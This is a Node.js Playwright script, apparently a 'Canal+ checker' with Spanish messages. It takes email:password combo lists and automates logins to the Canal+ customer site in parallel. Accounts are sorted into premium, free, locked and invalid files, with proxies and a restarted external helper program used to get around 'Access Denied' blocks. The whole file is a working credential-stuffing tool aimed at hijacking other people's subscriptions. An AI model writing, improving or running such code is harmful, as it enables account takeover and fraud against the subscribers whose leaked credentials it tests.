const fs = require('fs');
const readline = require('readline');
const { chromium } = require('playwright');
const chalk = require('chalk');
const cliProgress = require('cli-progress');
const ora = require('ora').default;
const { spawn, exec } = require('child_process');

const comboPath = 'C:\\Users\\opc\\Downloads\\canalplus-checker-con-node-main\\canalplus-checker-con-node-main\\combo.txt';
const validPath = 'C:\\Users\\opc\\Downloads\\canalplus-checker-con-node-main\\canalplus-checker-con-node-main\\validacceso.txt';
const freePath = 'C:\\Users\\opc\\Downloads\\canalplus-checker-con-node-main\\canalplus-checker-con-node-main\\free.txt';
const lockedPath = 'C:\\Users\\opc\\Downloads\\canalplus-checker-con-node-main\\canalplus-checker-con-node-main\\locked.txt';
const pailasPath = 'C:\\Users\\opc\\Downloads\\canalplus-checker-con-node-main\\canalplus-checker-con-node-main\\pailas.txt';

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

let externalProcess = null;

function startExternalProgram() {
  if (externalProcess) return;
  externalProcess = spawn('C:\\Users\\opc\\Downloads\\usf\\u2211.exe', {
    detached: true,
    stdio: 'ignore'
  });
  externalProcess.unref();
  console.log(chalk.blue('? u2211.exe iniciado'));
}

function killExternalProgram() {
  return new Promise((resolve) => {
    exec('taskkill /IM u2211.exe /F', (error, stdout, stderr) => {
      if (error) {
        console.log(chalk.yellow(`?? No se pudo cerrar u2211.exe (posiblemente ya estaba cerrado): ${error.message}`));
      } else {
        console.log(chalk.red('? u2211.exe cerrado correctamente'));
        externalProcess = null;
      }
      resolve();
    });
  });
}

async function restartExternalProgram() {
  await killExternalProgram();
  startExternalProgram();
}

const ask = (question) => new Promise(resolve => rl.question(question, resolve));

async function trySelectors(page, selectors, action, value = null) {
  for (const selector of selectors) {
    try {
      const element = await page.waitForSelector(`xpath=${selector}`, { timeout: 3000 });
      if (action === 'fill') {
        await element.fill(value);
      } else if (action === 'click') {
        await element.click();
      }
      return selector;
    } catch (e) {
      continue;
    }
  }
  throw new Error(`Ninguno de los selectores fue válido para la acción ${action}`);
}

async function procesarCombo(combo, index, total, counts) {
  let reintentar = true;

  while (reintentar) {
    const spinner = ora(`[${index + 1}/${total}] Comprobando ${combo}`).start();
    let browser = null;

    try {
      browser = await chromium.connectOverCDP('http://localhost:9222');
      const context = await browser.newContext();
      const page = await context.newPage();

      await page.goto('https://client.canalplus.com/?sc_intcmp=MYCWEB:USERMENU:EC');
      await page.waitForLoadState('load');

      await page.click('xpath=//*[@id="didomi-notice-agree-button"]/span').catch(() => {});
      await page.waitForTimeout(1);
      await page.click('xpath=//*[@id="app"]/div/div/main/div/div[2]/div[1]/div[1]/button');
      await page.waitForTimeout(1);

      const modal = await page.$('xpath=/html/body/div[2]/div/div[2]/div').catch(() => null);
      if (modal) {
        spinner.warn(chalk.magenta(`[${index + 1}/${total}] ?? Modal inesperado detectado, reiniciando entorno y reintentando combo...`));
        await browser.close();

        await restartExternalProgram();
        continue;
      }

      const [email, password] = combo.split(/:(.*)/).map(p => p.trim());

      const emailSelectors = ['//*[@id="input28"]', '//*[@id="input29"]', '//*[@id="input30"]'];
      const passSelectors = ['//*[@id="input36"]', '//*[@id="input37"]', '//*[@id="input38"]'];
      const loginBtnSelectors = ['//*[@id="form20"]/div[2]/input', '//*[@id="form21"]/div[2]/input', '//*[@id="form22"]/div[2]/input'];

      await trySelectors(page, emailSelectors, 'fill', email);
      await trySelectors(page, passSelectors, 'fill', password);
      await trySelectors(page, loginBtnSelectors, 'click');

      const loginResult = await Promise.race([
        (async () => {
          const error = await page.waitForSelector('xpath=//*[@id="error-message"]', { timeout: 15000 }).catch(() => null);
          if (error) return 'invalid';
        })(),
        (async () => {
          const locked = await Promise.any([
            page.waitForSelector('xpath=//*[@id="form63"]/div[1]/h1', { timeout: 9000 }),
            page.waitForSelector('xpath=//*[@id="form61"]/div[1]/h1', { timeout: 9000 })
          ]).catch(() => null);
          if (locked) return 'locked';
        })(),
        (async () => {
          const pailas = await page.waitForSelector('xpath=/html/body/div/div/div[2]/div/div/input', { timeout: 10000 }).catch(() => null);
          const noError = !(await page.$('xpath=//*[@id="error-message"]'));
          if (pailas && noError) return 'pailas';
        })(),
        (async () => {
          await page.waitForTimeout(11000);
          const html = await page.content();
          if (html.includes('Access Denied')) return 'access_denied';
        })(),
        (async () => {
          const success = await page.waitForSelector('xpath=//*[@id="app"]/div/div/main/div/div[2]/nav/ul/li[2]/a/div[1]/div', { timeout: 25000 }).catch(() => null);
          if (success) return 'success';
        })()
      ]);

      switch (loginResult) {
        case 'invalid':
          spinner.fail(chalk.red(`[${index + 1}/${total}] ${combo} ? INVÁLIDO | ? Válidos: ${counts.valid} | ? Inválidos: ${counts.invalid} | ?? Candados: ${counts.locked}`));
          fs.appendFileSync(pailasPath, combo + '\n', 'utf8');
          counts.invalid++;
          break;

        case 'locked':
          spinner.fail(chalk.hex('#A52A2A')(`[${index + 1}/${total}] ${combo} ?? ACCOUNT CANDADO | ? Válidos: ${counts.valid} | ? Inválidos: ${counts.invalid} | ?? Candados: ${counts.locked}`));
          fs.appendFileSync(lockedPath, combo + '\n', 'utf8');
          counts.locked++;
          break;

        case 'pailas':
          spinner.warn(chalk.hex('#8A2BE2')(`[${index + 1}/${total}] ${combo} ?? PAILAS detectado | Reiniciando entorno...`));
          fs.appendFileSync(pailasPath, combo + '\n', 'utf8');
          counts.pailas++;
          if (browser) await browser.close();
          await restartExternalProgram();
          return await procesarCombo(combo, index, total, counts); // Reintenta
          break;

        case 'access_denied':
          spinner.warn(chalk.magenta(`[${index + 1}/${total}] ${combo} ? Access Denied | Reiniciando entorno...`));
          if (browser) await browser.close();
          await restartExternalProgram();
          return await procesarCombo(combo, index, total, counts); // Reintenta
          break;

        case 'success':
          const success = await page.$('xpath=//*[@id="app"]/div/div/main/div/div[2]/nav/ul/li[2]/a/div[1]/div');
          await success.click();
          await page.waitForTimeout(23000);

          const freeIndicator = await page.$('xpath=//*[@id="app"]/div/div/main/div/div/div/div[2]');

          if (!freeIndicator) {
            spinner.warn(chalk.hex('#FFA500')(`[${index + 1}/${total}] ${combo} ?? VÁLIDO pero cuenta FREE | ? Válidos: ${counts.valid} | ? Inválidos: ${counts.invalid} | ?? Candados: ${counts.locked}`));
            fs.appendFileSync(freePath, combo + '\n', 'utf8');
            counts.free++;
          } else {
            spinner.succeed(chalk.green(`[${index + 1}/${total}] ${combo} ? PREMIUM | ? Válidos: ${counts.valid} | ? Inválidos: ${counts.invalid} | ?? Candados: ${counts.locked}`));
            fs.appendFileSync(validPath, combo + '\n', 'utf8');
            counts.valid++;
          }
          break;

        default:
          spinner.warn(chalk.yellow(`[${index + 1}/${total}] ${combo} ?? Resultado incierto`));
          counts.inconcluso++;
          break;
      }

      await browser.close();
      return loginResult;

    } catch (err) {
      if (browser) {
        await browser.close();
      }

      await restartExternalProgram();

      ora().warn(chalk.magenta(`[${index + 1}/${total}] ?? Error al procesar combo (${combo}): ${err.message}. Reintentando...`));
      continue;
    }
  }
}

(async () => {
  console.log(chalk.cyan('?? Asegúrate de que ya abriste Chrome con el puerto CDP habilitado (9222).'));

  startExternalProgram();

  const usarProxies = (await ask('¿Deseas usar proxy? (s/n): ')).toLowerCase();

  let proxyToShow = null;
  if (usarProxies === 's') {
    const proxyFilePath = await ask('Ingresa la ruta del archivo de proxies (ip:puerto): ');
    if (!fs.existsSync(proxyFilePath)) {
      console.log(chalk.red('? Archivo de proxies no encontrado.'));
      process.exit();
    }

    const proxies = fs.readFileSync(proxyFilePath, 'utf8').split('\n').map(p => p.trim()).filter(Boolean);

    if (proxies.length === 0) {
      console.log(chalk.red('? El archivo de proxies está vacío.'));
      process.exit();
    }

    proxyToShow = proxies[0];
    console.log(chalk.magenta(`?? Recuerda configurar este proxy manualmente en Chrome: ${proxyToShow}`));
  } else {
    console.log(chalk.yellow('?? Se ejecutará sin proxy.'));
  }

  const combosRaw = fs.readFileSync(comboPath, 'utf8').split('\n').map(l => l.trim()).filter(Boolean);

  const combos = combosRaw.filter(line => {
    const [email, password] = line.split(/:(.*)/).map(p => p.trim());
    return email && password && !email.includes(".@") && !email.includes(" ");
  });

  let maxConcurrency = parseInt(await ask('¿Cuántos threads deseas usar? (1-10): '), 10);
  if (isNaN(maxConcurrency) || maxConcurrency < 1 || maxConcurrency > 10) {
    console.log(chalk.red('?? Valor inválido, se usará 1 por defecto.'));
    maxConcurrency = 1;
  }

const bar = new cliProgress.SingleBar({
  format: '{bar} | {percentage}% | {value}/{total} combos | ? Válidas: {valid} | ? Inválidas: {invalid} | ?? Candadas: {locked}',
  barCompleteChar: '\u2588',
  barIncompleteChar: '\u2591',
  hideCursor: true
}, cliProgress.Presets.shades_classic);

  bar.start(combos.length, 0);

  const counts = { valid: 0, invalid: 0, free: 0, locked: 0, inconcluso: 0, pailas: 0 };
  const queue = combos.map((combo, index) => ({ combo, index }));
  const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

  const worker = async () => {
    while (queue.length > 0) {
      const { combo, index } = queue.shift();
      await procesarCombo(combo, index, combos.length, counts);
bar.update(
  counts.valid + counts.invalid + counts.free + counts.locked + counts.pailas,
  {
    valid: counts.valid,
    invalid: counts.invalid,
    locked: counts.locked
  }
);
    }
  };

  for (let i = 0; i < maxConcurrency; i++) {
    setTimeout(() => worker(), i * 6000);
  }
})();
